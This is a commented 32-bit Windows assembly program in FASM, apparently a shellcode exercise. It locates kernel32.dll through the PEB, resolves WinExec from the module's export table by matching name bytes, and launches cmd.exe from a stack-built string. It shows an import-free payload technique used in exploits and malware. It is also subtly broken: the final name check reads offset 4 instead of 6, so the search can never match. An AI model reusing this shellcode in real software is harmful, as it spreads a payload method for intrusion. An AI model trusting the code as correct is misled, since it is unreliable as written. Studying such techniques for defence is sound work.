format PE console
use32
entry start

start:
	push eax ; Save all registers
	push ebx
	push ecx
	push edx
	push esi
	push edi

	; Establish a new stack frame
	push ebp
	mov ebp, esp

	xor ecx, ecx                ; makes ecx == 0
	mov eax, [fs:0x30]      ; get PEB from TEB's offset 0x30
	mov eax, [eax+0xc]          ; get loaded modules into this process's info
	mov eax, [eax+0x14]         ; access InMemoryOrderModuleList and get info of this exe
	mov eax, [eax]              ; get info of ntdll.dll
	mov eax, [eax]              ; get info of kernel32.dll
	mov ebx, [eax+0x10]         ; get address of kernel32.dll loaded in memory
	mov edx, [ebx+0x3c]         ; get e_lfanew which has the offset location of PE header
	add edx, ebx                ; get the exact location of the PE header
	mov edx, [edx+0x78]         ; get the offset of export table
	add edx, ebx                ; get the exact location of the export table
	mov esi, [edx+0x20]         ; get AddressofNames offset
	add esi, ebx                ; get the exact location of the AddressofNames

.loop:
	inc ecx                     		; increment index counter for AddressOfNameOrdinals later
	lodsd                       		; get the offset the string address of the function name
	add eax, ebx						; get the actual address string of the function name
	cmp dword [eax], 0x456e6957			; "EniW" (remember x86 is little endian)
	jnz start.loop						; jump if 1st 4 letters of the function name is different
	cmp word [eax+0x4], 0x6578			; "ex"
	jnz start.loop						; jump if next 2 letters of the function name is different
	cmp byte [eax+0x4], 0x63			; 'c'
	jnz start.loop						; jump if last letter of the function name is different

.continue:
	dec ecx 						; decrease ecx by 1 cause array starts from 1 and Get_CreateProc_Index inc 1st
	mov esi, [edx+0x24]         	; get AddressOfNameOrdinals offset
	add esi, ebx                	; get the exact location of the AddressOfNameOrdinals
	mov ecx, [esi+ecx*2]			; get the index of WinExec()
	mov esi, [edx+0x1c]         	; get AddressOfFunctions offset
	add esi, ebx                	; get the exact location of the AddressOfFunctions
	mov esi, [esi+ecx*4]			; get the offset address of WinExec()
	add esi, ebx                	; get the exact location of WinExec()
	xor ecx, ecx 					; make ecx == 0
	push ecx 						; null terminator for string "cmd.exe"
	push 0x61657865					; "aexe" (remember x86 is little endian)
	sub dword [esp+0x3], 0x61 		; Remove "a"
	push 0x2e646d63					; ".dmc"
	mov eax, esp					; to get the string address of "cmd.exe"
	push 5 						; push 5 as WinExec argument for uCmdShow
	push eax						; push string address of "cmd.exe" as WinExec argument for lpCmdLine
	call esi 						; call WinExec()
	add esp, 0xc 					; clear stack

.finish:
	pop ebp 		; restore all registers and exit
	pop edi
	pop esi
	pop edx
	pop ecx
	pop ebx
	pop eax
	ret 
